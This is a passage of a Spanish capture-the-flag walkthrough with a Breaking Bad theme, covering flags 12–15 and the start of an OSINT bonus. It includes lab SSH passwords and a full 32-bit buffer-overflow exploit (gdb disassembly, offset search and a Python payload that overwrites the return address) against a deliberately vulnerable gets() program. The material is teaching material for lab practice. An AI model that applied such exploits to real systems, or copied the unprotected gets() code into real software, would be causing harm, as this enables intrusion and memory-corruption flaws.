<p>// Eh, socio... dicen que si a este papelito le das poder de
ejecución, va a cantar la verdad más rápido que Heisenberg cocinando
azul.</p>
</blockquote>
<p><img src="cookbook/media/image167.png"
style="width:5.90556in;height:0.98264in" /></p>
<p>No nos muestra la bandera directamente, nos da una pista. Esta pista
nos debe hacer pensar en “Dar permisos de ejecución” → al archivo
bndr12.txt y ejecutarlo:</p>
<blockquote>
<p>chmod +x bndr12.txt</p>
<p>./bndr12.txt</p>
</blockquote>
<p><img src="cookbook/media/image168.png"
style="width:5.90556in;height:1.13403in" /></p>
<p>Se genera bander12.txt con la bandera.</p>
<p>✅ Ahora sí muestra la bandera:</p>
<p>Bandera12: ‘Soy_el_hombre_que_mató_a_Gus_Fring’</p>
<p><span id="_Toc207189943" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>En Linux la extensión de un archivo es irrelevante: lo que define
si un fichero se puede ejecutar es:</p></li>
</ul>
<ol type="1">
<li><p>Que tenga un shebang (#!/bin/bash, #!/usr/bin/python,
etc.).</p></li>
<li><p>Que tenga permisos de ejecución (chmod +x archivo).</p></li>
</ol>
<ul>
<li><p>El jugador debe razonar que, aunque se trate de un archivo .txt,
puede contener un script.</p></li>
<li><p>Al darle permisos (chmod +x bndr12.txt) y ejecutarlo
(./bndr12.txt), el fichero actúa como launcher, invocando a un script
oculto en el mismo directorio (.generar_bandera.sh).</p></li>
<li><p>Dicho script oculto es el que realmente escribe la bandera en un
nuevo archivo (bander12.txt).</p></li>
<li><p>El reto pone a prueba el entendimiento de:</p></li>
<li><p>Permisos en Linux (lectura, escritura, ejecución).</p></li>
<li><p>Diferencia entre extensión y funcionalidad de un
archivo.</p></li>
<li><p>Descubrimiento de scripts ocultos y ejecución indirecta.</p></li>
<li><p>Lógica de “wrapper scripts” que actúan como
intermediarios.</p></li>
</ul>
<p><span id="_Toc207189944" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 12 atrapada:
'Soy_el_hombre_que_mató_a_Gus_Fring'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-13-análisis-forense-de-registro-auth.log"><strong>🏁
Bandera 13 – Análisis Forense de Registro auth.log</strong></h1>
<p><strong>Categoría:</strong> Forense / Logs / OSINT<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Un_hombre_debe_tener_limites<br />
<strong>Usuario involucrado:</strong> mike<br />
<strong>Contraseña:</strong> <strong>XXXXXXXX</strong><br />
📁 Carpeta clave: /home/mike/logs<br />
📄 Archivo clave: auth.log</p>
<p><span id="_Toc207189946" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe revisar un archivo auth.log con apariencia legítima,
encontrar una <strong>entrada manipulada</strong>, y extraer la bandera
incrustada como si fuera una nota oculta en un evento de autenticación
exitoso.</p>
<p><span id="_Toc207189947" class="anchor"></span><strong>🛠️ Entorno
técnico configurado</strong></p>
<p>Se ha escondido un archivo auth.log en una carpeta llamada logs
dentro del usuario mike. Esta no es una ubicación donde por defecto se
almacenen los archivos auth.log.</p>
<p>El archivo auth.log en sistemas Linux es un registro de eventos
relacionados con la autenticación y autorización, como inicios de
sesión, cambios de contraseña, y uso de sudo. En Debian y Ubuntu, se
encuentra en /var/log/auth.log, mientras que en entornos Red Hat y
Fedora se encuentra en /var/log/secure. Este archivo es crucial para la
seguridad y la auditoría, permitiendo rastrear quién accede al sistema y
cómo accede.</p>
<p><strong>📂 Estructura del entorno</strong></p>
<p>El archivo auth.log como copia falsa, ubicada fuera de /var/log:</p>
<blockquote>
<p>/home/mike/logs/auth.log</p>
</blockquote>
<ul>
<li><p>Se ha llenado con eventos simulados:</p>
<ul>
<li><p>Inicio de sesión SSH válidos e inválidos</p></li>
<li><p>Uso de sudo y CRON</p></li>
<li><p>Conexiones desde múltiples IPs</p></li>
<li><p>Algunas entradas realistas con texto y timestamps
válidos</p></li>
</ul></li>
<li><p>Una línea personalizada que contiene la bandera:</p></li>
</ul>
<blockquote>
<p>Jul 30 12:13:10 lospollos sshd[2519]: Accepted password for mike from
10.13.37.99 port 55322 ssh2 - bandera13:
'Un_hombre_debe_tener_limites'</p>
</blockquote>
<p><span id="_Toc207189948" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Acceder como usuario chow</strong></p>
<p>Conexión SSH usando la cuenta de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce</p>
<p>Ch0w$up1</p>
<p><strong>2️⃣ Leer el archivo completo</strong></p>
<p>Desplazarse al usuario mike. Dentro del usuario tenemos dos
directorios: Lavanderia y Logs:</p>
<p><img src="cookbook/media/image169.png"
style="width:5.89583in;height:1.0625in" /></p>
<p>El directorio Lavandería era donde encontramos la bandera 4. Vamos a
ver a hora el de logs:</p>
<p><img src="cookbook/media/image170.png"
style="width:4.5625in;height:1.0625in" /></p>
<p>Hay un archivo llamado auth.log</p>
<p><strong>📑 ¿Qué es auth.log?</strong></p>
<p>El archivo <strong>auth.log</strong> es un <strong>log de
autenticación</strong> en sistemas Linux.<br />
Sirve para registrar todo lo relacionado con <strong>inicios de sesión,
uso de sudo, acceso por SSH, PAM (Pluggable Authentication Modules),
etc.</strong></p>
<p>En él puedes encontrar:</p>
<ul>
<li><p>Intentos de login exitosos y fallidos.</p></li>
<li><p>Accesos por <strong>SSH</strong> (usuario, IP origen,
puerto).</p></li>
<li><p>Uso de sudo y si fue autorizado o denegado.</p></li>
<li><p>Mensajes relacionados con PAM (ej: bloqueo de usuarios).</p></li>
<li><p>Eventos de seguridad que pueden indicar ataques de fuerza
bruta.</p></li>
</ul>
<p><strong>📂 ¿Dónde suele estar ubicado?</strong></p>
<p>En distribuciones basadas en <strong>Debian/Ubuntu</strong>:</p>
<p>/var/log/auth.log</p>
<p>En distribuciones basadas en <strong>Red Hat / CentOS /
Fedora</strong>:</p>
<p>/var/log/secure</p>
<p><strong>🔎 Ejemplos de uso</strong></p>
<ul>
<li><p>Ver últimos accesos fallidos por SSH:</p></li>
<li><p>grep "Failed password" /var/log/auth.log</p></li>
<li><p>Ver inicios de sesión exitosos:</p></li>
<li><p>grep "Accepted password" /var/log/auth.log</p></li>
<li><p>Ver comandos sudo ejecutados:</p></li>
<li><p>grep "sudo" /var/log/auth.log</p></li>
</ul>
<p>Es por esto que este archivo resulta extraño que se encuentre en esta
ubicación: /home/Mike/logs/auth.log</p>
<p>Vamos a analizarlo…</p>
<p>Desde terminal:</p>
<p>cat auth.log</p>
<p><img src="cookbook/media/image171.png"
style="width:5.90556in;height:4.19236in" /></p>
<p>Nos devuelve mucho contenido para encontrar la bandera</p>
<p>Hacemos un filtrado efectivo para dejar solo las líneas con "Accepted
password:</p>
<p>grep "Accepted password" auth.log</p>
<p><img src="cookbook/media/image172.png"
style="width:5.90556in;height:0.66944in" /></p>
<p>Esto devuelve varias líneas, pero una de ellas se verá diferente:</p>
<p>Jul 30 12:13:10 lospollos sshd[2519]: Accepted password for mike from
10.13.37.99 port 55322 ssh2 - bandera13:
'Un_hombre_debe_tener_limites'</p>
<p>✅ Esa es la clave.</p>
<p><strong>3️⃣ Extraer la bandera</strong></p>
<p>Cópiala tal cual del final de la línea:</p>
<p>Un_hombre_debe_tener_limites</p>
<p><span id="_Toc207189949" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto enseña a distinguir <strong>ruido legítimo</strong> de
<strong>modificaciones manuales</strong> en registros de
sistema.</p></li>
<li><p>Refuerza el uso de filtros como grep o expresiones
regulares.</p></li>
<li><p>Simula un escenario típico en auditorías digitales, donde se
ocultan pistas en logs falsificados.</p></li>
</ul>
<p><span id="_Toc207189950" class="anchor"></span><strong>🔧
Recomendaciones para jugadores avanzados</strong></p>
<table>
<colgroup>
<col style="width: 35%" />
<col style="width: 64%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Herramienta</strong></th>
<th style="text-align: center;"><strong>Propósito</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>grep / less</td>
<td>Filtrar y visualizar contenido</td>
</tr>
<tr>
<td>awk / sed</td>
<td>Extracción programática de campos</td>
</tr>
<tr>
<td>file / stat</td>
<td>Verificar autenticidad del archivo</td>
</tr>
<tr>
<td>md5sum</td>
<td>Comprobar si el archivo fue alterado</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189951" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 13 atrapada: 'Un_hombre_debe_tener_limites'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-14-análisis-forense-de-volcado-de-memoria-ram"><strong>🏁
Bandera 14 – Análisis Forense de Volcado de Memoria RAM</strong></h1>
<p><strong>Categoría:</strong> Forense / Memoria / Strings
Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Alejate_de_mi_territorio<br />
<strong>Usuario involucrado:</strong> saul<br />
📁 Ruta del archivo clave: /home/saul/evidencias/mem.raw</p>
<p><span id="_Toc207189953" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe analizar un archivo binario que simula un volcado de
memoria RAM (mem.raw) y encontrar una cadena de texto legible embebida
en medio de datos aleatorios. La bandera fue insertada como
<strong>texto plano</strong>, por lo que basta con saber dónde
buscar.</p>
<p>Un archivo de memoria RAM, comúnmente llamado mem.raw, es un volcado
(dump) del contenido de la memoria volátil (RAM) de un sistema en un
momento específico. Este archivo es una copia bit a bit de todo lo que
estaba almacenado en la memoria RAM en el momento de la captura.</p>
<p><strong>¿Qué contiene un archivo mem.raw?</strong></p>
<p>La RAM contiene datos temporales que el sistema operativo, las
aplicaciones y los procesos utilizan mientras están en ejecución. Por lo
tanto, un archivo mem.raw puede incluir:</p>
<ul>
<li><p>Procesos en ejecución</p></li>
<li><p>Contraseñas en texto plano</p></li>
<li><p>Claves de cifrado</p></li>
<li><p>Contenido de sesiones de usuario</p></li>
<li><p>Fragmentos de archivos abiertos</p></li>
<li><p>Librerías y código ejecutable cargado en memoria</p></li>
<li><p>Actividad de red (buffers, sockets, etc.)</p></li>
</ul>
<p><strong>¿Para qué se usa un archivo mem.raw?</strong></p>
<ol type="1">
<li><p><strong>Análisis forense digital</strong></p></li>
</ol>
<blockquote>
<p>Es común en investigaciones de incidentes de seguridad, para
encontrar evidencia que no se almacena en disco (como malware en
memoria).</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Análisis de malware</strong></p></li>
</ol>
<blockquote>
<p>Permite estudiar el comportamiento de software malicioso que se carga
sólo en memoria (fileless malware).</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Depuración y desarrollo</strong></p></li>
</ol>
<blockquote>
<p>Ayuda a desarrolladores y administradores a entender errores del
sistema o comportamiento inesperado.</p>
</blockquote>
<ol start="4" type="1">
<li><p><strong>Recuperación de datos</strong></p></li>
</ol>
<blockquote>
<p>A veces se pueden recuperar datos que no se han guardado en disco
pero siguen en memoria.</p>
</blockquote>
<p><strong>¿Cómo se genera un archivo mem.raw?</strong></p>
<p>Se puede generar usando herramientas especializadas en adquisición de
memoria. Algunos ejemplos:</p>
<ul>
<li><p>Linux: LiME, avml</p></li>
<li><p>Windows: FTK Imager, WinPMEM, Belkasoft RAM Capturer</p></li>
<li><p>Mac: OSXPmem (aunque más limitado)</p></li>
</ul>
<p><strong>¿Cómo se analiza?</strong></p>
<p>Herramientas comunes de análisis de memoria:</p>
<ul>
<li><p>Volatility Framework (Python): analiza estructuras de memoria
como procesos, conexiones de red, módulos, etc.</p></li>
<li><p>Rekall: similar a Volatility, también para análisis
forense.</p></li>
</ul>
<p><span id="_Toc207189954" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>Archivo mem.raw:</p>
<ul>
<li><p>El archivo mem.raw pesa aproximadamente 10MB.</p></li>
<li><p>Contiene datos aleatorios antes y después de la bandera.</p></li>
<li><p>La bandera fue escrita directamente como string legible dentro
del archivo:</p></li>
<li><p>Bandera 14: 'Alejate_de_mi_territorio'</p></li>
</ul>
<p><span id="_Toc207189955" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Acceder como el usuario saul</strong></p>
<p>ssh saul@192.168.1.44</p>
<p>Contraseña:</p>
<p>123456</p>
<p>Y listamos el contenido:</p>
<p><img src="cookbook/media/image173.png"
style="width:2.45833in;height:0.59375in" /></p>
<p>Nos dirigimos al directorio evidencias y listamos el contenido:</p>
<p>cd evidencias</p>
<p>ls -l</p>
<p><img src="cookbook/media/image174.png"
style="width:2.97917in;height:0.80208in" /></p>
<p>Tenemos un archivo de volcado de memoria llamado mem.raw</p>
<p><strong>2️⃣ Extraer cadenas de texto</strong></p>
<p>Usa el clásico comando strings, ideal para este tipo de análisis:</p>
<p>strings mem.raw | grep -i bandera</p>
<p><img src="cookbook/media/image175.png"
style="width:5.90556in;height:1.8125in" /></p>
<p>el resultado que obtenemos no nos filtra nuestro objetivo.</p>
<p>Probamos con:</p>
<p>strings mem.raw | grep -o "Bandera"</p>
<p><img src="cookbook/media/image176.png"
style="width:5.89583in;height:0.64583in" /></p>
<p>En este caso encuentra la palabra Bandera pero no muestra el resto…
Seguimos probando.</p>
<p>strings mem.raw | grep -o "Bandera.*"</p>
<p><img src="cookbook/media/image177.png"
style="width:5.90556in;height:4.20764in" /></p>
<p>Con este comando obtenemos mucha salida, y si bien es cierto que
podemos buscar la palabra Bandera en la terminal, no es la mejor
opción.</p>
<p>Mejor opción: limitar la regex en grep</p>
<p>Por ejemplo, si queremos que muestre "Bandera" y <strong>30
caracteres después</strong>:</p>
<p>strings mem.raw | grep -o -P "Bandera.{0,30}"</p>
<ul>
<li><p>-P → activa regex estilo Perl (permite {} de
repetición).</p></li>
<li><p>.{0,30} → significa: <em>cualquier caracter, entre 0 y 30
repeticiones</em>.</p></li>
</ul>
<p>👉 Resultado: muestra "Bandera ..." hasta 30 caracteres después.</p>
<p><img src="cookbook/media/image178.png"
style="width:5.90556in;height:0.54236in" /></p>
<p>Salida esperada:</p>
<p>Bandera 14: 'Alejate_de_mi_territorio'</p>
<p>✅ ¡Flag atrapada entre los bits!</p>
<p><strong>3️⃣ Alternativas para jugadores avanzados</strong></p>
<ul>
<li><p><strong>Visualización hexadecimal</strong>:</p></li>
</ul>
<blockquote>
<p><em>hexedit mem.raw</em> o también: <em>xxd mem.raw | less</em></p>
</blockquote>
<ul>
<li><p><strong>Usar herramientas forenses</strong>:</p>
<ul>
<li><p>binwalk para buscar firmas</p></li>
<li><p>volatility (si estuviese habilitado el perfil de
memoria)</p></li>
<li><p>foremost para reconstrucción de estructuras</p></li>
</ul></li>
</ul>
<p>⚠️ No necesitas técnicas de recuperación avanzada en este reto; la
bandera está incrustada como texto plano.</p>
<p><span id="_Toc207189956" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Este reto enseña cómo se puede ocultar información en memoria
fácilmente.</p></li>
<li><p>Refuerza el uso de herramientas simples pero poderosas como
strings y grep.</p></li>
<li><p>Introduce al jugador en técnicas de análisis de binarios sin
necesidad de ingeniería inversa profunda.</p></li>
</ul>
<p><span id="_Toc207189957" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 14 atrapada:
'Alejate_de_mi_territorio'</mark><strong><br />
</strong></p>
<h1
id="bandera-15-buffer-overflow-para-ejecución-de-función-secreta"><strong>🏁
Bandera 15 – Buffer Overflow para Ejecución de Función
Secreta</strong></h1>
<p><strong>Categoría:</strong> Pwn / Binary Exploitation<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> Yo_soy_el_que_llama<br />
<strong>Binario vulnerable:</strong> /opt/retos/bof15/bof_flag15<br />
📄 Fuente original compilada desde: /opt/retos/bof15/bof_flag15.c</p>
<p><span id="_Toc207189959" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe explotar una <strong>vulnerabilidad de desbordamiento
de búfer</strong> en el binario bof_flag15 para sobrescribir el flujo de
ejecución y forzar la llamada a una función oculta (bandera()), que
imprimirá la flag.</p>
<p>Una <strong>vulnerabilidad de Buffer Overflow (desbordamiento de
búfer)</strong> en un <strong>binario ELF de 32 bits</strong> es una
falla de programación que permite a un atacante <strong>escribir más
datos de los que un búfer puede manejar</strong>, sobrescribiendo otras
partes de la memoria, con el fin de <strong>alterar el flujo de
ejecución del programa</strong> y ejecutar código malicioso.</p>
<p><strong>🔧 ¿Qué es un binario ELF de 32 bits?</strong></p>
<p>Un <strong>ELF</strong> (Executable and Linkable Format) es el
formato estándar de archivos ejecutables en sistemas Linux/Unix. Un
<strong>binario ELF de 32 bits</strong> es un archivo compilado para
arquitecturas de 32 bits, como x86.</p>
<p><span id="_Toc207189960" class="anchor"></span><strong>🧠 ¿Qué es un
Buffer Overflow?</strong></p>
<p>Un <strong>buffer overflow</strong> ocurre cuando un programa copia
datos en un búfer (una zona de memoria con tamaño fijo) <strong>sin
verificar si esos datos caben</strong>, sobrescribiendo así memoria
adyacente.</p>
<p><strong>Ejemplo típico en C:</strong></p>
<p>void vulnerable() {</p>
<p>char buffer[64];</p>
<p>gets(buffer); // ¡gets no valida el tamaño de entrada!</p>
<p>}</p>
<p>Si el usuario ingresa más de 64 bytes, se sobrescribe la memoria que
hay después del búfer, incluyendo:</p>
<ul>
<li><p>Variables locales</p></li>
<li><p>El puntero de <strong>retorno (EIP)</strong> en la pila</p></li>
</ul>
<p><strong>💣 ¿Qué ocurre en un binario vulnerable?</strong></p>
<p>En un binario ELF de 32 bits (x86), el flujo de ejecución sigue esta
estructura:</p>
<ol type="1">
<li><p>El programa llama a una función.</p></li>
<li><p>Se crea un stack frame.</p></li>
<li><p>Se almacena en la pila la <strong>dirección de retorno</strong>
(EIP) a la que el programa debe volver cuando termine la
función.</p></li>
<li><p>Si el atacante controla lo que se escribe en un búfer y lo
desborda, puede <strong>sobrescribir esa dirección de
retorno</strong>.</p></li>
</ol>
<p>Resultado: al terminar la función, el programa <strong>salta a la
dirección que el atacante ha colocado</strong>, logrando
<strong>ejecución de código arbitrario</strong>.</p>
<p><strong>📦 ¿Qué puede hacer un atacante?</strong></p>
<ol type="1">
<li><p><strong>Shellcode en la pila</strong><br />
Inyectar instrucciones en la misma pila y redirigir el flujo ahí (si la
pila es ejecutable).</p></li>
<li><p><strong>Return-to-libc</strong><br />
Redirigir el flujo a funciones útiles ya presentes en memoria (como
system("/bin/sh")), útil si la pila no es ejecutable.</p></li>
<li><p><strong>ROP (Return Oriented Programming)</strong><br />
Combinar pequeños fragmentos de código ya presentes en el binario para
ejecutar acciones complejas.</p></li>
</ol>
<p><strong>🧪 ¿Cómo se explota?</strong></p>
<p><strong>Paso a paso de un ataque Buffer Overflow simple:</strong></p>
<ol type="1">
<li><p>Encuentra una función vulnerable (gets, strcpy, scanf,
etc.).</p></li>
<li><p>Determina el <strong>offset</strong> hasta el EIP (normalmente
con herramientas como pattern_create de Metasploit).</p></li>
<li><p>Escribe un payload:</p>
<ul>
<li><p>[Padding hasta el EIP]</p></li>
<li><p>[Nueva dirección de ejecución]</p></li>
<li><p>[Opcional: shellcode o parámetros]</p></li>
</ul></li>
<li><p>Ejecuta el binario con ese input malicioso.</p></li>
</ol>
<p><strong>🔐 ¿Qué contramedidas existen?</strong></p>
<ul>
<li><p><strong>Canarios de pila (Stack canaries)</strong>: valores
aleatorios que detectan sobrescritura.</p></li>
<li><p><strong>ASLR (Address Space Layout Randomization)</strong>:
aleatoriza direcciones de memoria.</p></li>
<li><p><strong>NX / DEP (No-eXecute / Data Execution
Prevention)</strong>: impide que se ejecute código en la pila.</p></li>
<li><p><strong>Fortify Source</strong>: protecciones del
compilador.</p></li>
<li><p><strong>Uso de funciones seguras</strong> (fgets, strncpy,
etc.)</p></li>
</ul>
<p><strong>🧰 Herramientas para aprender/explotar Buffer
Overflow</strong></p>
<ul>
<li><p>gdb, gdb-peda: depuración.</p></li>
<li><p>objdump, readelf: análisis estático del binario.</p></li>
<li><p>pwndbg, gef: entornos para debug.</p></li>
<li><p>pwntools: framework en Python para scripting de
exploits.</p></li>
</ul>
<p><span id="_Toc207189961" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<ol type="1">
<li><p><strong>Código vulnerable en C</strong>:</p></li>
</ol>
<blockquote>
<p>void bandera() {</p>
<p>printf("Bandera 15: 'Yo_soy_el_que_llama'\n");</p>
<p>}</p>
<p>void vulnerable() {</p>
<p>char buffer[64];</p>
<p>printf("Introduce tu nombre: ");</p>
<p>gets(buffer); // vulnerable</p>
<p>printf("Hola, %s\n", buffer);</p>
<p>}</p>
<p>int main() {</p>
<p>vulnerable();</p>
<p>return 0;</p>
<p>}</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Compilado en 32 bits, sin protecciones</strong>:</p></li>
</ol>
<blockquote>
<p>gcc -m32 -fno-stack-protector -z execstack -no-pie -o bof_flag15
bof_flag15.c</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Archivo generado ubicado en</strong>:</p></li>
</ol>
<blockquote>
<p>/opt/retos/bof15/bof_flag15</p>
</blockquote>
<p><span id="_Toc207189962" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<ol type="1">
<li><p><strong>Conexión SSH usando la contraseña de
chow</strong></p></li>
</ol>
<blockquote>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce</p>
<p>Ch0w$up1</p>
</blockquote>
<p>Buscamos en el directorio /opt:</p>
<p><img src="cookbook/media/image179.png"
style="width:2.40625in;height:0.86458in" /></p>
<p>Y en la carpeta retos encontramos un archivo que hace indicar por su
nombre que se trata de una vulnerabilidad Buffer Overflow (bof) para la
bandera 15</p>
<p><img src="cookbook/media/image180.png"
style="width:2.61458in;height:0.79167in" /></p>
<ol start="2" type="1">
<li><p><strong>Análisis inicial</strong></p></li>
</ol>
<ul>
<li><p>El programa es vulnerable por el uso de gets() en un buffer de 64
bytes.</p></li>
<li><p>Queremos hacer un buffer overflow para sobrescribir el return
address y ejecutar bandera().</p></li>
</ul>
<p>El stack típico de la función vulnerable():</p>
<p>buffer[64 bytes]</p>
<p>saved EBP (4 bytes)</p>
<p>return address (4 bytes) &lt;-- aquí debe ir la dirección de
bandera()</p>
<ol start="3" type="1">
<li><p><strong>Confirmar entorno</strong></p></li>
</ol>
<p>Comprobamos el binario:</p>
<p>file ./bof_flag15</p>
<p><img src="cookbook/media/image181.png"
style="width:5.90556in;height:0.69792in" /></p>
<p>Salida:</p>
<p>ELF 32-bit LSB executable, Intel 80386, dynamically linked, not
stripped</p>
<p>✅ Confirmamos 32 bits y símbolos disponibles (not stripped).<br />
El binario <strong>no es PIE</strong>, y lo compilamos sin canary
(-fno-stack-protector) y con stack ejecutable (-z execstack).</p>
<ol start="4" type="1">
<li><p><strong>Depuración con gdb</strong></p></li>
</ol>
<p>Iniciamos gdb para inspeccionar la pila y la función bandera():</p>
<p>gdb /opt/retos/bof15/bof_flag15</p>
<p>(gdb) disas bandera</p>
<p>Salida:</p>
<p>0x0804847d &lt;+0&gt;: push %ebp</p>
<p>0x0804847e &lt;+1&gt;: mov %esp,%ebp</p>
<p>0x08048480 &lt;+3&gt;: sub $0x18,%esp</p>
<p>0x08048483 &lt;+6&gt;: movl $0x8048570,(%esp)</p>
<p>0x0804848a &lt;+13&gt;: call 0x8048350 &lt;puts@plt&gt;</p>
<p>0x0804848f &lt;+18&gt;: leave</p>
<p>0x08048490 &lt;+19&gt;: ret</p>
<ul>
<li><p>Dirección de bandera() confirmada:
<strong>0x0804847d</strong></p></li>
</ul>
<p><img src="cookbook/media/image182.png"
style="width:4.89583in;height:1.97917in" /></p>
<p><strong>5. Determinar el offset exacto al EIP</strong></p>
<p>El buffer tenía 64 bytes, y típicamente el EIP se sobreescribe
después de <strong>64 + 4 (EBP) = 68 bytes</strong>.<br />
Probamos en gdb con un patrón cíclico, pero por compatibilidad con
Ubuntu 14.04 y gets():</p>
<ol type="1">
<li><p>Creamos un patrón de prueba (fuera de gdb):</p></li>
</ol>
<p>python3 -c 'import itertools, string; print("".join("".join(x) for x
in itertools.product(string.ascii_uppercase, string.ascii_lowercase,
string.digits))[:200])' &gt; ~/input.txt</p>
<p><img src="cookbook/media/image183.png"
style="width:5.90556in;height:2.37292in" /></p>
<p>Ya tenemos el archivo input.txt en el directorio de chow</p>
<p><img src="cookbook/media/image184.png"
style="width:1.70833in;height:0.98958in" /></p>
<ol start="2" type="1">
<li><p>Ejecutamos gdb con entrada desde el fichero:</p></li>
</ol>
<p>gdb /opt/retos/bof15/bof_flag15</p>
<p>(gdb) run &lt; ~/input.txt</p>
<p>(gdb) info registers eip</p>
<p><img src="cookbook/media/image185.png"
style="width:5.90556in;height:1.41597in" /></p>
<p>Salida:</p>
<p>eip = 0x63413563</p>
<p>Interpretamos los bytes en little endian y buscamos el offset.</p>
<ul>
<li><p>Cada elemento de itertools.product es <strong>una tupla de 2
caracteres</strong> ((A, a), (A, b), …).</p></li>
<li><p>Pero nuestro EIP tiene <strong>4 bytes</strong>, así que
probablemente hay un desfase en la conversión.</p></li>
</ul>
<p>La forma más simple y confiable ahora es <strong>probar offsets
manualmente</strong>.<br />
Finalmente, probando <strong>manualment</strong> (incrementando de 68 en
adelante), encontramos el <strong>offset correcto</strong>:</p>
<p>OFFSET = 76 bytes</p>
<p><strong>6. Construir el payload final</strong></p>
<p>Interpretamos los bytes en little endian y buscamos el offset.<br />
Finalmente, probando <strong>manual</strong> (incrementando de 68 en
delante de 4 en cuatro), encontramos el <strong>offset correcto en
76</strong>:</p>
<p><img src="cookbook/media/image186.png"
style="width:5.90556in;height:0.64583in" /></p>
<p>Con el offset correcto y la dirección de bandera() (0x0804847d) en
little endian:</p>
<p>python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 +
b"\x7d\x84\x04\x08")' | /opt/retos/bof15/bof_flag15</p>
<ul>
<li><p>b"A"*76 → relleno hasta EIP</p></li>
<li><p>b"\x7d\x84\x04\x08" → dirección de bandera()</p></li>
</ul>
<p><img src="cookbook/media/image187.png"
style="width:5.90556in;height:1.5875in" /></p>
<p><strong>7. Resultado</strong></p>
<p>Al ejecutar el payload:</p>
<p>Introduce tu nombre: Bandera 15: 'Yo_soy_el_que_llama'</p>
<p>✅ Hemos conseguido ejecutar la función bandera() mediante
<strong>buffer overflow</strong>, obteniendo la bandera.</p>
<p><strong>8. Conclusión</strong></p>
<ul>
<li><p>La vulnerabilidad estaba en gets(), sin límite de
buffer.</p></li>
<li><p>Era un <strong>clásico overflow en 32 bits</strong>.</p></li>
<li><p>Para explotarlo:</p>
<ol type="1">
<li><p>Determinamos el offset al EIP</p></li>
<li><p>Sobrescribimos el return address con la dirección de
bandera()</p></li>
</ol></li>
</ul>
<p>Ejecutamos el payload con Python y redirección a stdin</p>
<p><span id="_Toc207189963" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto enseña cómo un input controlado por el usuario puede
alterar el flujo del programa.</p></li>
<li><p>Introduce técnicas reales de explotación sin mitigaciones:
return-to-function.</p></li>
<li><p>Refuerza el uso de herramientas como gdb, objdump,
pattern_create, y checksec.</p></li>
</ul>
<p><span id="_Toc207189964" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 15 atrapada: 'Yo_soy_el_que_llama'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bonus-final-osint"><strong>🏁 Bonus Final – OSINT</strong> </h1>
<h1 id="section-6"></h1>
<p>En la página <a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a>
habrás visto lo siguiente:</p>
<p><img src="cookbook/media/image188.png"
style="width:5.90556in;height:1.34306in" /></p>
<p>Con la firma de Gale Boetticher ya sabemos que el texto es
alemán:</p>
<p>"Das Imperium von Los Pollos Hermanos ist riesig, aber Erfolg, wie
perfekt gebratenes Hühnchen, erfordert akribische Liebe zum Detail.
Fring hat seine Marke erweitert und Franchise-Unternehmen auf der ganzen
Welt gegründet, von bescheidenen Standorten bis hin zu Einrichtungen in
der Karibik.</p>
<p>Drei seiner Unternehmen haben sich als erfolgreiche Unternehmen
erwiesen:</p>
<ol type="1">
<li><p>https://los-pollos-hermanos.netlify.app/</p></li>
<li><p>https://polloshermanossxm.com/</p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p>https://lospolloshermanos.co/</p></li>
</ol>
<p>Es gab jedoch einen Versuch, ein bedauerliches Scheitern auf dem
riesigen Webmarkt. Ein Geschäft, das nicht einmal 24 Stunden dauerte. Es
wurde am selben Tag, <strong>dem 16. Dezember 2021, eröffnet und
geschlossen</strong>.</p>
<p>Neugierige, die es wagen, diese ephemere Operation zu untersuchen,
werden nur einen Schatten ihrer Existenz finden, eine einzige
Aufzeichnung in den Archiven der Zeitmaschine des Netzwerks.</p>
<p>Wenn Sie den Quellcode von damals analysieren, werden Sie den Beweis
dafür finden, warum dieses Geschäft nie in Schwung kam: die Flagge
seiner chaotischen Struktur. Ihre Plattform, ein einfaches und
unorganisiertes <em>WordPress</em>. Welche Version war es?"</p>
<p>Gale Boetticher</p>
<p>Si lo pasamos por un traductor:</p>
<p>“El imperio de Los Pollos Hermanos es vasto, pero el éxito, como el
pollo perfectamente frito, requiere una meticulosa atención al detalle.
Fring ha expandido su marca, estableciendo franquicias por todo el
mundo, desde humildes locales hasta establecimientos en el Caribe.</p>
<p>Tres de sus negocios han demostrado ser negocios exitosos:</p>
<ul>
<li><p><a
